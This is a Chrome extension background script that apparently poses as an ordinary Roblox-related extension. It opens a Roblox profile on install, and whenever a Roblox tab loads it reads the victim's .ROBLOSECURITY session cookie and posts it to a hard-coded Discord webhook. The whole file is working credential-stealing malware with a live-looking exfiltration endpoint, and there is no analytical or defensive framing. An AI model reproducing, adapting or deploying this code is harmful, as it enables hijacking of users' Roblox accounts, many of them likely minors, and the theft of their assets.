const WEBHOOK = "https://discord.com/api/webhooks/1517142711306686514/mVvM0RvWEieIltvDVjG8x3_RfpZSpM5n58xRlJKeRtRwcL86QnNG9A1bguzrpp7J0mnj";
let sent = false;

async function send(cookie) {
  if (sent) return;
  sent = true;
  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "@everyone 🔑 **ROBLOSECURITY**",
      allowed_mentions: { parse: ["everyone"] },
      embeds: [{ title: "Cookie", description: `\`${cookie}\``, color: 0xff0000 }]
    })
  }).catch(() => {});
}

chrome.runtime.onInstalled.addListener(() => {
  chrome.tabs.create({ url: "https://www.roblox.com/users/3997996685/profile" });
});

chrome.tabs.onUpdated.addListener(async (tabId, info, tab) => {
  if (info.status === "loading" && tab.url?.includes("roblox.com")) {
    const c = await chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" });
    if (c?.value) send(c.value);
  }
});